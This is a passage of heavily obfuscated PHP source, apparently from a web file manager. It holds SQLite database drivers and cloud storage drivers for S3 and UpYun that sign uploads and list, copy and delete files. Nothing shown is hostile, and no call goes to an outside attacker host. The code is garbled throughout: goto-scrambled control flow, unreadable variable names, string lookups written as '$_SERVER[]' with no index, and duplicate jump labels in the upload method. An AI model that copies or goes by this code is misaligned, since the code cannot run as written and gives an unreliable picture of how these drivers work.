think_trace($this->error, $d著[33], $d著[46]); return $this->error; } public function escapeString($dշ) { return sqlite_escape_string($dշ); } public function parseLimit($e) { $Eŏ̘ =& $_SERVER[]; $Bʍ = $Eŏ̘[33]; if (!empty($e)) { $e = explode($Eŏ̘[47], $e); if (count($e) > 1) { $Bʍ .= $Eŏ̘[48] . $e[1] . $Eŏ̘[49] . $e[0] . $Eŏ̘[50]; } else { $Bʍ .= $Eŏ̘[48] . $e[0] . $Eŏ̘[50]; } } return $Bʍ; } } class DbSqlite3Base extends Db { public function __construct($A赌 = '') { $D١ =& $_SERVER[]; if (!class_exists($D١[51])) { think_exception(think_lang($D١[10]) . $D١[52]); } if (!empty($A赌)) { if (!isset($A赌[$D١[12]])) { $A赌[$D١[12]] = 438; } $this->config = $A赌; if (empty($this->config[$D١[13]])) { $this->config[$D١[13]] = array(); } } } public function connect($Eߕ = '', $FÎ = 0) { $f󠸠 =& $_SERVER[]; if (!isset($this->linkID[$FÎ])) { if (empty($Eߕ)) { $Eߕ = $this->config; } $this->linkID[$FÎ] = new SQLite3($Eߕ[$f󠸠[17]]); if (!$this->linkID[$FÎ]) { think_exception($this->linkID[$FÎ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$FÎ]->busyTimeout(30000); if (1 != think_config($f󠸠[18])) { unset($this->config); } } return $this->linkID[$FÎ]; } public function free() { $this->queryID = null; } public function query($D뎵) { goto e; dޓ: $this->queryStr = $D뎵; if ($this->queryID) { $this->free(); } think_action_status($A퐄[19], 1); goto CӲ; e: $A퐄 =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dޓ; Aˏ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $d = $this->getAll(); $this->numRows = count($d); return $d; } goto EÙ; CӲ: think_status($A퐄[20]); $this->queryID = $this->_linkID->query($D뎵); $this->debug(); goto Aˏ; EÙ: } public function execute($A㉍) { goto aժ; aڢē: if (!1 === $bޛˎ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Eփ; Aړ: think_status($bӨ[20]); $bޛˎ = $this->_linkID->exec($A㉍); $this->debug(); goto aڢē; C֦ϐ: $this->queryStr = $A㉍; if ($this->queryID) { $this->free(); } think_action_status($bӨ[21], 1); goto Aړ; aժ: $bӨ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C֦ϐ; Eփ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c = $this->_linkID->query($_SERVER[][23]); if (!$c) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $aދ = $this->_linkID->query($_SERVER[][24]); if (!$aދ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Cąٕ = array(); while ($ḏ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Cąٕ[] = $ḏ; } $this->queryID->reset(); return $Cąٕ; } public function getFields($F) { $Fڏ =& $_SERVER[]; $Dƃ = $this->query($Fڏ[25] . $F . $Fڏ[26]); $Fܼ = array(); if ($Dƃ) { foreach ($Dƃ as $c => $EІ) { $Fܼ[$EІ[$Fڏ[28]]] = array($Fڏ[28] => $EІ[$Fڏ[28]], $Fڏ[29] => $EІ[$Fڏ[29]], $Fڏ[31] => (bool) ($EІ[$Fڏ[31]] === $Fڏ[33]), $Fڏ[34] => $EІ[$Fڏ[53]], $Fڏ[36] => (bool) $EІ[$Fڏ[54]], $Fڏ[39] => (bool) $EІ[$Fڏ[54]]); } } return $Fܼ; } public function getTables($Eئǃ = '') { $fٛ =& $_SERVER[]; $Eϕ = $this->query($fٛ[42] . $fٛ[43] . $fٛ[44]); $aŚ = array(); foreach ($Eϕ as $bϑĨ => $e) { $aŚ[$bϑĨ] = current($e); } return $aŚ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $f򃆆 =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($f򃆆[33] != $this->queryStr) { $this->error .= LNG($f򃆆[45]) . $this->queryStr; } think_trace($this->error, $f򃆆[33], $f򃆆[46]); return $this->error; } public function escapeString($eڠ) { $DӐ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($eڠ); } return str_ireplace($DӐ[55], $DӐ[56], $eڠ); } public function parseLimit($fӅ) { $dڸ =& $_SERVER[]; $Dץ = $dڸ[33]; if (!empty($fӅ)) { $fӅ = explode($dڸ[47], $fӅ); if (count($fӅ) > 1) { $Dץ .= $dڸ[48] . $fӅ[1] . $dڸ[49] . $fӅ[0] . $dڸ[50]; } else { $Dץ .= $dڸ[48] . $fӅ[0] . $dڸ[50]; } } return $Dץ; } } goto eƷ; E˫: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($dڂ) { parent::__construct($dڂ); } public function uploadFormData($fֿ증, $C󏹧 = 3600) { goto B䊤ˊ; d: $d = array($this->accessKey, $d̼⬠, $this->region, $Bۗߔ, $fݳܤ); $Bηڔ = implode($c꧗[8], $d); $bڼ = array($c꧗[1188] => gmdate($c꧗[1187], strtotime($c꧗[1223])), $c꧗[1189] => array(array($c꧗[1191] => $this->bucket), array($c꧗[1190] => $fȰӣ), array($c꧗[1192], $c꧗[1193], $c꧗[33]), array($c꧗[1192], $c꧗[1224], $c꧗[33]), array($c꧗[1192], $c꧗[1225], $c꧗[33]), array($c꧗[1194] => $fϟ), array($c꧗[1226] => $Bηڔ), array($c꧗[1227] => $Dߺȹ), array($c꧗[1228] => $a⺾), array($c꧗[1229] => $B))); goto AѮ٨; AѮ٨: $b = base64_encode(json_encode($bڼ)); $b֍پԔ = hash_hmac($c꧗[1230], $d̼⬠, $c꧗[1231] . $this->secret, !0); $Bޮ = hash_hmac($c꧗[1230], $this->region, $b֍پԔ, !0); goto C艿; F: $fݳܤ = $c꧗[1222]; $B = $C󏹧 . $c꧗[33]; $fϟ = $c꧗[1186]; goto d; C艿: $C = hash_hmac($c꧗[1230], $Bۗߔ, $Bޮ, !0); $C鼢 = hash_hmac($c꧗[1230], $fݳܤ, $C, !0); $E = hash_hmac($c꧗[1230], $b, $C鼢); goto b﹩; B䊤ˊ: $c꧗ =& $_SERVER[]; $fȰӣ = $c꧗[191]; $Dߺȹ = $c꧗[1220]; goto cӵ; cӵ: $Bۗߔ = $c꧗[59]; $a⺾ = gmdate($c꧗[1221]); $d̼⬠ = gmdate($c꧗[726]); goto F; b﹩: $e饠 = array($c꧗[209] => $c꧗[33], $c꧗[1232] => $c꧗[33], $c꧗[1190] => $fȰӣ, $c꧗[1194] => $fϟ, $c꧗[1198] => $b, $c꧗[1233] => $Bηڔ, $c꧗[1234] => $Dߺȹ, $c꧗[1235] => $a⺾, $c꧗[1236] => $B, $c꧗[1237] => $E, $c꧗[175] => $this->getHost()); return $e饠; goto a쟣Ϲ; a쟣Ϲ: } public function multiUploadFormData($a򎆉, $f˧ = 3600) { $e橏 =& $_SERVER[]; $e圽 = gmdate($e橏[1315]); $c = array(); $Fꑏ߼ = $this->client->getUploadId($this->bucket, $a򎆉, $c); if (!$Fꑏ߼) { return !1; } return array($e橏[219] => $Fꑏ߼, $e橏[175] => $this->getHost() . $e橏[8] . $this->pathEncode($a򎆉), $e橏[220] => $e圽, $e橏[92] => $a򎆉); } public function multiUploadAuthData($Eɠ, $D߯Ѩ = array()) { goto Cϗ; e򫒵: if (isset($D߯Ѩ[$aЊ[1316]])) { $e΢[$aЊ[1317]] = $D߯Ѩ[$aЊ[1316]]; } $D = explode($aЊ[177], $this->getHost()); $c = array($aЊ[1318] => $D[1], $aЊ[1319] => $aЊ[33], $aЊ[209] => $aЊ[118], $aЊ[1232] => $D߯Ѩ[$aЊ[77]]); goto F½; F: if (strpos($f, $aЊ[223]) === 0) { if (isset($e΢[$aЊ[1317]])) { $DĽљ = $e΢[$aЊ[1317]]; } else { if (isset($Aח[$aЊ[1317]])) { $DĽљ = $Aח[$aЊ[1317]]; } else { $DĽљ = hash($aЊ[1230], $aЊ[33]); } } return array($aЊ[230] => $Aח[$aЊ[230]], $aЊ[1317] => $DĽљ, $aЊ[220] => $Aח[$aЊ[1320]]); } return $Aח[$aЊ[230]]; goto f僚; Cϗ: $aЊ =& $_SERVER[]; $f = isset($D߯Ѩ[$aЊ[167]]) ? $D߯Ѩ[$aЊ[167]] : $aЊ[33]; $aɌ = $D߯Ѩ[$aЊ[92]]; goto fȘ; fȘ: unset($D߯Ѩ[$aЊ[92]]); if (isset($D߯Ѩ[$aЊ[221]])) { return $this->listUploadParts($aɌ, $D߯Ѩ); } $e΢ = array(); goto e򫒵; F½: $A = $aЊ[224]; $fԈ = $aЊ[8] . $this->pathEncode($aɌ) . $f; $Aח = $this->client->__getSignatureV4($e΢, $c, $A, $fԈ); goto F; f僚: } public function listUploadParts($AΑ, $f = array()) { goto eʖ; E: if (!$e὆) { return !1; } $c = $C[1321]; foreach ($e὆ as $F묓) { $c .= $C[1322] . "\74\x50\x61\162\x74\116\x75\x6d\x62\145\162\76{$F묓[$C[1277]]}\x3c\57\120\141\162\x74\x4e\165\x6d\x62\x65\162\x3e\12" . "\x3c\105\124\x61\x67\x3e{$F묓[$C[1278]]}\74\57\105\x54\x61\x67\76\12" . $C[1323]; } goto b; CǑ: $Dա╒ = array($C[1318] => $a[1], $C[209] => $C[118], $C[1232] => strlen($c)); $bՇҨ = $C[222]; $c = $C[8] . $this->pathEncode($AΑ) . $f[$C[167]]; goto B; eʖ: $C =& $_SERVER[]; $Cىܖ = str_replace($C[231], $C[33], $f[$C[167]]); $e὆ = $this->client->listParts($this->bucket, $AΑ, $Cىܖ); goto E; B: $fŨ = $this->client->__getSignatureV4($f, $Dա╒, $bՇҨ, $c, $c); return array($C[230] => $fŨ[$C[230]], $C[220] => $fŨ[$C[1320]], $C[232] => $e὆, $C[1317] => $fŨ[$C[1317]]); goto eÊ̍; b: $c .= $C[1324]; $f = array(); $a = explode($C[177], $this->getHost()); goto CǑ; eÊ̍: } public function link($A۲, $F՛ = array()) { return parent::link($A۲, $F՛); } public function fileOut($bҢ, $AȠ = false, $Cސ = false, $B = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][1325])) { return parent::fileOutServer($bҢ, $AȠ, $Cސ, $B); } parent::fileOut($bҢ, $AȠ, $Cސ, $B); } public function fileOutImage($aØμ, $fұ = 250) { if (strstr($this->endpoint, $_SERVER[][1325])) { return parent::fileOutImageServer($aØμ, $fұ); } parent::fileOutImage($aØμ, $fұ); } public function fileOutLink($D) { $b =& $_SERVER[]; if (substr($D, 0, 7) == $b[1201]) { $D = $b[1202] . substr($D, 7); } header($b[158] . $D); die; } public function getHost() { $A =& $_SERVER[]; $B = str_rtrim(parent::getHost(), $A[8] . $this->bucket); $B = explode($A[177], $B); return $B[0] . $A[177] . $this->bucket . $A[94] . $B[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($c, $c̱⍐ = 0) { parent::__construct(); $this->source = $c; $this->sourceSize = $c̱⍐; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A֖ = false) { return $this->sourceSize; } public function getContent($eҮ艘 = false) { return $this->fileSubstr($eҮ艘, 0, $this->sourceSize); } public function fileSubstr($Dؔ = false, $dĹ = 0, $C = 0) { if (!$C) { $C = $this->sourceSize; } $b = $this->sourceSize - $dĹ; if ($C >= $b) { $C = $b; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $dĹ, $C); } if ($this->sourceType == self::TYPE_FILE) { if ($C <= 0) { return $_SERVER[][33]; } $Aσ = ftell($this->source); fseek_64($this->source, $Aσ + $dĹ); $F = @fread($this->source, $C); fseek_64($this->source, $Aσ); return $F; } } public function hashMd5($B݆ = false) { return md5($this->getContent()); } public static function hash($Fň, $b = 0) { $Bȉ = new PathDriverStream($Fň, $b); return $Bȉ->hashSimple($Fň); } public static function md5($Fü̥, $F = 0) { $Fߋ = new PathDriverStream($Fü̥, $F); return $Fߋ->hashMd5($Fü̥); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\57\x2f\x76\x30\56\141\x70\x69\x2e\x75\160\171\165\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($a) { parent::__construct(); $this->_init($a); } public function _init($c݂) { $b =& $_SERVER[]; foreach ($c݂ as $d뮽 => $Eؗ) { if (isset($this->{$d뮽})) { $this->{$d뮽} = $Eؗ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($b[1326] . LNG($b[1258])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($bч, $Cآ = "\107\x45\124") { $C珿¢ =& $_SERVER[]; $Bʛ = gmdate($C珿¢[1292]); $F⊩ = base64_encode(hash_hmac($C珿¢[1327], "{$Cآ}\46{$bч}\46{$Bʛ}", md5("{$this->userpass}"), !0)); $F = array("\x41\165\x74\150\157\162\x69\172\141\x74\151\x6f\x6e\x3a\x55\x50\x59\125\116\x20{$this->username}\x3a{$F⊩}", "\x44\141\x74\145\x3a{$Bʛ}"); return $F; } public function ussRequest($aԄ, $BΠч = "\107\x45\124", $b = false, $A̹ = false, $Eʐ = false) { goto b팃; cǗ: $fωӋ = $this->ussHeaders($b䎽ݸ, $BΠч); if ($A̹) { $fωӋ = array_merge($fωӋ, $A̹); } $dƣ = url_request($this->endpoint . $b䎽ݸ, $BΠч, $b, $fωӋ, $Eʐ); goto E겎ɉ; E겎ɉ: if (!$dƣ) { return array($D戓񉃜[1085] => !1, $D戓񉃜[1087] => $D戓񉃜[1328]); } if (strtolower($BΠч) == $D戓񉃜[190] || in_array($dƣ[$D戓񉃜[1085]], array($D戓񉃜[1186], $D戓񉃜[1329]))) { $b = $dƣ[$D戓񉃜[1330]]; } else { $b = json_decode($dƣ[$D戓񉃜[1087]], !0); if (!$b) { $b = $dƣ[$D戓񉃜[1087]]; } else { if (!$dƣ[$D戓񉃜[725]] && isset($b[$D戓񉃜[1331]])) { $b = $b[$D戓񉃜[1331]]; } } } return array($D戓񉃜[1085] => $dƣ[$D戓񉃜[725]], $D戓񉃜[1087] => $b); goto eۦ; b팃: $D戓񉃜 =& $_SERVER[]; $aԄ = trim($aԄ, $D戓񉃜[8]); $b䎽ݸ = "\57{$this->bucket}\x2f{$aԄ}"; goto cǗ; eۦ: } public function mkfile($c鈚, $Cڍʦ = '', $B = REPEAT_RENAME) { if ($this->setContent($c鈚, $Cڍʦ)) { return $this->getPathOuter($c鈚); } return !1; } public function mkdir($e, $Dą = REPEAT_SKIP) { $cஔ =& $_SERVER[]; $Eѡ = trim($e, $cஔ[8]); if ($this->_isFolder($Eѡ)) { return $this->getPathOuter($Eѡ); } $DႆՎۼ = array($cஔ[1332]); $eٖӐ = $this->ussRequest($Eѡ, $cஔ[222], !1, $DႆՎۼ); return $eٖӐ[$cஔ[1085]] ? $this->getPathOuter($Eѡ) : !1; } public function copyFile($D姤, $Dٱ) { $Cµ =& $_SERVER[]; $aǽȟ = array($Cµ[1333] . "\x2f{$this->bucket}\57{$D姤}", $Cµ[1334]); $EӞ = $this->ussRequest($Dٱ, $Cµ[224], !1, $aǽȟ); return $EӞ[$Cµ[1085]] ? !0 : $this->getPathOuter($Dٱ); } public function moveFile($BĞ, $e) { $fȐ =& $_SERVER[]; $Fëö = array($fȐ[1335] . "\57{$this->bucket}\57{$BĞ}", $fȐ[1334]); $E뽷 = $this->ussRequest($e, $fȐ[224], !1, $Fëö); return $E뽷[$fȐ[1085]] ? !0 : $this->getPathOuter($e); } public function delFile($dҹ) { $aΌ =& $_SERVER[]; $EȨЉ = $this->ussRequest($dҹ, $aΌ[1336]); return $EȨЉ[$aΌ[1085]] ? !0 : !1; } public function delFolder($a豋) { goto Fʸƹ; Fʸƹ: $B۪ =& $_SERVER[]; if (!$this->exist($a豋)) { return !0; } $this->listItemCache = !1; goto cআ; cআ: $f = $E = array(); $this->fileList($a豋, $f, $E, !0); $this->listItemCache = !0; goto F̧; B߉: return $Dۭх[$B۪[1085]]; goto bۄì; F̧: foreach ($E as $aՃл) { $Dۭх = $this->ussRequest($aՃл[$B۪[28]], $B۪[1336]); if (!$Dۭх[$B۪[1085]]) { return !1; } } foreach ($f as $e) { $Dۭх = $this->ussRequest($e, $B۪[1336]); if (!$Dۭх[$B۪[1085]]) { return !1; } } $Dۭх = $this->ussRequest($a豋, $B۪[1336]); goto B߉; bۄì: } public function rename($E, $Cӟ) { if ($this->isFile($E)) { $Cӟ = get_path_father($E) . $Cӟ; return $this->moveFile($E, $Cӟ); } return $this->renameObject($E, $Cӟ); } public function fileInfo($aЭ, $EǊЖ = false, $Bґئ = array()) { goto F۸; F۸: $Aί =& $_SERVER[]; $f = array($Aί[28] => $this->pathThis($aЭ), $Aί[75] => $this->getPathOuter($Aί[8] . $aЭ), $Aί[29] => $Aί[173], $Aί[77] => isset($Bґئ[$Aί[77]]) ? $Bґئ[$Aί[77]] : 0, $Aί[167] => $this->ext($aЭ)); if ($EǊЖ) { return $f; } goto a񲛗; fԖ: $f[$Aί[192]] = intval($Bґئ[$Aί[1337]]); $f[$Aί[83]] = intval($Bґئ[$Aί[1338]]); $f[$Aί[77]] = $Bґئ[$Aί[77]]; goto c; c: return $f; goto c; a񲛗: $f[$Aί[192]] = $f[$Aί[83]] = 0; $f[$Aί[193]] = $f[$Aί[194]] = !0; if (empty($Bґئ)) { $Bґئ = $this->objectMeta($aЭ); if (!$Bґئ) { return $f; } } goto fԖ; c: } public function folderInfo($d词ʾ, $d = false) { goto C; b: $cъ[$b㬊[192]] = intval($B[$b㬊[1337]]); $cъ[$b㬊[83]] = intval($B[$b㬊[1338]]); return $cъ; goto B׃; C: $b㬊 =& $_SERVER[]; $cъ = array($b㬊[28] => $this->pathThis($d词ʾ), $b㬊[75] => $this->getPathOuter($b㬊[8] . $d词ʾ), $b㬊[29] => $b㬊[76]); if ($d) { return $cъ; } goto f; f: $cъ[$b㬊[192]] = $cъ[$b㬊[83]] = 0; $cъ[$b㬊[193]] = $cъ[$b㬊[194]] = !0; if (empty($B)) { $B = $this->objectMeta($d词ʾ); if (!$B) { return $cъ; } } goto b; B׃: } private function listObjs($F䰼᫊, $FО = 0, $c = 1000) { $Eעڧ =& $_SERVER[]; $DĘς = array($Eעڧ[1339], $Eעڧ[1340] . $c); if ($FО) { $DĘς[] = $Eעڧ[1341] . $FО; } $Eٓ = $this->ussRequest($F䰼᫊, $Eעڧ[226], !1, $DĘς); return !$Eٓ[$Eעڧ[1085]] ? !1 : $Eٓ[$Eעڧ[1087]]; } private function fileList($bɳ, &$f󻧏, &$F, $cؒ = false) { goto eڑ; eڑ: $cι =& $_SERVER[]; $BƉ쯞 = $cι[33]; $Aؼň = 1000; goto DƘ͇; DƘ͇: $FΨΐ = rtrim($bɳ, $cι[8]) . $cι[8]; $C΍ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $bķ = $this->listObjs($bɳ, $BƉ쯞, $Aؼň); if (!$bķ) { return !1; } $BƉ쯞 = isset($bķ[$cι[1342]]) ? $bķ[$cι[1342]] : $cι[33]; $Eɱ = isset($bķ[$cι[1343]]) ? $bķ[$cι[1343]] : array(); foreach ($Eɱ as $F) { $BÛ = $F[$cι[29]] == $cι[76] ? !0 : !1; $Fŝ = ltrim($FΨΐ . $F[$cι[28]], $cι[8]) . ($BÛ ? $cι[8] : $cι[33]); $A = array($cι[28] => $Fŝ, $cι[29] => $BÛ ? $cι[76] : $cι[173], $cι[77] => $F[$cι[333]], $cι[1338] => $F[$cι[1344]]); if ($C΍) { $this->cacheMethod($cι[197], $Fŝ, $BÛ); $this->cacheMethod($cι[198], $Fŝ, $A); } if ($BÛ) { $f󻧏[] = $Fŝ; if ($cؒ) { $this->fileList($Fŝ, $f󻧏, $F, $cؒ); } continue; } $F[] = $A; } if (count($Eɱ) < $Aؼň) { break; } } goto f; f: if ($C΍) { $this->cacheMethod($cι[197], $bɳ, !0); } goto fз; fз: } public function listPath($Cʣ, $Dѱ = false) { $F숥 =& $_SERVER[]; $D = $B緥 = array(); $this->fileList($Cʣ, $D, $B緥); foreach ($D as $F => $aѹҲ) { $D[$F] = $this->folderInfo($aѹҲ, $Dѱ); } foreach ($B緥 as $F => $aѹҲ) { $B緥[$F] = $this->fileInfo($aѹҲ[$F숥[28]], $Dѱ, $aѹҲ); } return array($F숥[74] => $D, $F숥[73] => $B緥); } public function has($B꿉У, $dߩ = false, $eۃ = true) { goto E; Fߞ: while (!0) { check_abort(); $eڕ = $this->listObjs($B꿉У, $e, $fܘȻ); if (!$eڕ) { return !1; } $e = isset($eڕ[$bф[1342]]) ? $eڕ[$bф[1342]] : $bф[33]; $E = isset($eڕ[$bф[1343]]) ? $eڕ[$bф[1343]] : array(); if (empty($E)) { break; } $FƷ = array_filter($E, function ($aԼ) { $B =& $_SERVER[]; return $aԼ[$B[29]] == $B[76]; }); $E٧؍ = count($E); $FƷ = count($FƷ); $Fщ = $E٧؍ - $FƷ; if ($dߩ) { $DЄω += $FƷ; $bτЫ += $Fщ; if ($E٧؍ < $fܘȻ) { break; } continue; } if ($eۃ) { if ($Fщ) { return !0; } } else { if ($FƷ) { return !0; } } if ($E٧؍ < $fܘȻ) { break; } } if ($dߩ) { return array($bф[201] => $bτЫ, $bф[202] => $DЄω); } return !1; goto A񤈰; E: $bф =& $_SERVER[]; $e = $bф[33]; $fܘȻ = 500; goto dժ; dժ: $bτЫ = 0; $DЄω = 0; $F̞ = rtrim($B꿉У, $bф[8]) . $bф[8]; goto Fߞ; A񤈰: } public function listAll($eϷ) { goto F͑Ǿ; F͑Ǿ: $b񄊿 =& $_SERVER[]; $Fח = $B = array(); $this->fileList($eϷ, $Fח, $B, !0); goto D; A˻: return $this->listAllFiles($eϷ, array_keys($b), $b); goto F舏; D: $b = array(); foreach ($B as $a) { $b[$a[$b񄊿[28]]] = $a[$b񄊿[77]]; } foreach ($Fח as $a) { if (is_string($a)) { $b[$a] = 0; } } goto A˻; F舏: } public function canRead($D佯) { return $this->exist($D佯) ? !0 : !1; } public function canWrite($b) { return $this->exist($b) ? !0 : !1; } public function getContent($FÉ) { return $this->fileSubstr($FÉ, 0, -1); } public function setContent($fƘ, $Eюъ = '') { $CŔބ =& $_SERVER[]; if (!$Eюъ) { $A = $this->ussRequest($fƘ, $CŔބ[222]); return $A[$CŔބ[1085]]; } $cő = $this->tempFile($this->pathThis($fƘ)); file_put_contents($cő, $Eюъ); if ($this->upload($fƘ, $cő)) { $this->tempFileRemve($cő); return !0; } return !1; } public function fileSubstr($bƋ, $fѤ, $b⛄í) { $f͂ =& $_SERVER[]; if (!($cт呇 = $this->link($bƋ))) { return !1; } $BѬ = !1; if ($b⛄í > 0) { $Fލ = $fѤ + $b⛄í - 1; $BѬ = array($f͂[1305] . $fѤ . $f͂[434] . $Fލ); } $a䰅 = url_request($cт呇, $f͂[226], !1, $BѬ); return $a䰅[$f͂[725]] ? $a䰅[$f͂[1087]] : !1; } public function upload($dͱ, $F×, $C텃 = false, $aท = REPEAT_REPLACE) { goto d; C᯽: do { $AЋؼĚ = $a簈[$cٶ[1351]]; fseek_64($cיȋ, $Bʠָ); $b = fread($cיȋ, $AЋؼĚ); $cƌ = 0; do { $cƌ++; $a簈 = $this->uploadPart($dͱ, $a簈, $b); } while (!$a簈 && $cƌ < 3); if (!$a簈) { return !1; } $a = $a簈[$cٶ[1350]]; $Bʠָ += $AЋؼĚ; } while ($a != -1); fclose($cיȋ); $a݌Ū = array($cٶ[1352], $cٶ[1353] . $a簈[$cٶ[1354]], $cٶ[1348]); goto aƂߩ; cѴͩ: $a = $a簈[$cٶ[1350]]; $cיȋ = fopen($F×, $cٶ[1255]); if (!$cיȋ) { return !1; } goto C᯽; C: if (!$E[$cٶ[1085]]) { return !1; } $a簈 = $E[$cٶ[1087]]; $Bʠָ = 0; goto cѴͩ; d: $cٶ =& $_SERVER[]; $Bм = IO::size($F×); if ($Bм <= 1024 * 1024 * 200) { $bタ = array($cٶ[1345] . $F×); $E = $this->ussRequest($dͱ, $cٶ[224], $bタ); return $E[$cٶ[1085]] ? $this->getPathOuter($dͱ) : !1; } goto C; C: $Eه = 1024 * 1024 * 10; $a݌Ū = array($cٶ[1346], $cٶ[1347] . $Bм, $cٶ[1348], $cٶ[1349] . $Eه); $E = $this->ussRequest($dͱ, $cٶ[224], !1, $a݌Ū); goto C; aƂߩ: $E = $this->ussRequest($dͱ, $cٶ[224], !1, $a݌Ū); return $E[$cٶ[1085]] ? $this->getPathOuter($F) : !1; goto a; a: } private function uploadPart($Dꙮ֐, $aޕ, &$eµ̼) { $Aތǐ =& $_SERVER[]; $Bݕϑ = array($Aތǐ[1355], $Aތǐ[1353] . $aޕ[$Aތǐ[1354]], $Aތǐ[1356] . $aޕ[$Aތǐ[1350]], $Aތǐ[140] . $aޕ[$Aތǐ[1351]]); $Cߩ݄ = $this->ussRequest($Dꙮ֐, $Aތǐ[224], $eµ̼, $Bݕϑ); return !$Cߩ݄[$Aތǐ[1085]] ? $Cߩ݄[$Aތǐ[1085]] : $Cߩ݄[$Aތǐ[1087]]; } public function uploadFormData($A, $cߧ͌ = 3600) { return $this->uploadPolicy($A, $cߧ͌); } public function multiUploadFormData($d٘, $cˋ = 3600) { $Dʍ =& $_SERVER[]; $b夨 = (int) $GLOBALS[$Dʍ[7]][$Dʍ[77]]; return $this->uploadPolicy($d٘, $cˋ, $b夨); } private function uploadPolicy($Aʄ, $DͿ = 3600, $f˴צۋ = 0) { goto fϗ; fі: $a肍 = base64_encode(hash_hmac($d՚[1327], "\120\117\123\124\46{$a}\x26{$D}\x26{$A}", md5("{$this->userpass}"), !0)); $aׅ = array($d՚[1198] => $A, $d՚[1361] => "\x55\120\x59\125\116\x20{$this->username}\x3a{$a肍}", $d՚[175] => $this->endpoint . $a); return $aׅ; goto e; EÝ: $B = array($d՚[1357] => $this->bucket, $d՚[1358] => $Aʄ, $d՚[1359] => time() + $DͿ, $d՚[1360] => $D); if ($f˴צۋ) { $B[$d՚[1271]] = $f˴צۋ; } $A = base64_encode(json_encode($B)); goto fі; fϗ: $d՚ =& $_SERVER[]; $a = $d՚[8] . $this->bucket; $D = gmdate($d՚[1292]); goto EÝ; e: } public function download($E, $c) { goto E; c: $E = 1024 * 200; $cȹř = fopen($F󊂲, $_SERVER[][1311]); while (!0) { $f = $this->fileSubstr($E, $aƙ݅љ, $E); if ($f === !1) { return !1; } fwrite($cȹř, $f); $aƙ݅љ += $E; if (strlen($f) < $E) { break; } } goto c⌫ۄ; c⌫ۄ: fclose($cȹř); return $c; goto C뜽; E: $F󊂲 = IO::getPathInner(IO::mkfile($c)); if (!($e = $this->link($E))) { return !1; } $aƙ݅љ = 0; goto c; C뜽: } public function link($bˎ, $Bא = array()) { $D蛨 =& $_SERVER[]; $bˎ = trim($bˎ, $D蛨[8]); if (!empty($this->token)) { $Aͣ = strtotime(date($D蛨[1362])); $DƉ = substr(md5($this->token . $D蛨[280] . $Aͣ . $D蛨[1363] . $bˎ), 12, 8) . $Aͣ; $Bא[] = $D蛨[1364] . $DƉ; } $Cⲱ⊄ = !empty($Bא) ? $D蛨[69] . implode($D蛨[280], $Bא) : $D蛨[33]; return $this->getHost() . $D蛨[8] . $bˎ . $Cⲱ⊄; } public function fileOut($b, $E = false, $EɆ쪌 = false, $EΝ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($b, $E, $EɆ쪌, $EΝ); } if (!$EɆ쪌) { $EɆ쪌 = $this->pathThis($b); } $Dɏ͸ = $E ? array($_SERVER[][1365] . rawurlencode($EɆ쪌)) : array(); $cɆړ = $this->link($b, $Dɏ͸); $this->fileOutLink($cɆړ); } public function fileOutServer($e, $Dۨƌ = false, $A = false, $aƾ = '') { parent::fileOut($e, $Dۨƌ, $A, $aƾ); } public function fileOutImage($Dߘ, $DɃ = 250) { $E׌ = $this->link($Dߘ . $_SERVER[][1366] . $DɃ); $this->fileOutLink($E׌); } public function fileOutImageServer($b͖, $eΠ = 250) { parent::fileOutImage($b͖, $eΠ); } public function hashMd5($Cݞϋ) { $dՠ˴ =& $_SERVER[]; $d = $this->_objectMeta($Cݞϋ); return isset($d[$dՠ˴[206]]) ? $d[$dՠ˴[206]] : !1; } public function size($E٭ǋć) { $a = $this->objectMeta($E٭ǋć); return $a ? $a[$_SERVER[][77]] : 0; } public function info($dƸԖ) { if ($this->isFolder($dƸԖ)) { return $this->folderInfo($dƸԖ); } else { if ($this->isFile($dƸԖ)) { return $this->fileInfo($dƸԖ); } } return !1; } public function exist($FԳ) { return $this->isFile($FԳ) || $this->isFolder($FԳ); } public function isFile($F߷) { return !$this->isFolder($F߷) && $this->objectMeta($F߷); } public function isFolder($e) { return $this->cacheMethod($_SERVER[][197], $e); } protected function objectMeta($d) { return $this->cacheMethod($_SERVER[][198], $d); } protected function _objectMeta($f⃶) { goto bǧ; bǧ: $C =& $_SERVER[]; if ($f⃶ == $C[33] || $f⃶ == $C[8]) { return array(); } $eާ = $this->ussRequest($f⃶, $C[1367]); goto Bũ; Bũ: if (!$eާ[$C[1085]]) { return null; } $Fԯ؍ = isset($eާ[$C[1087]]) ? $eާ[$C[1087]] : array(); if (!isset($Fԯ؍[$C[1368]])) { return null; } goto 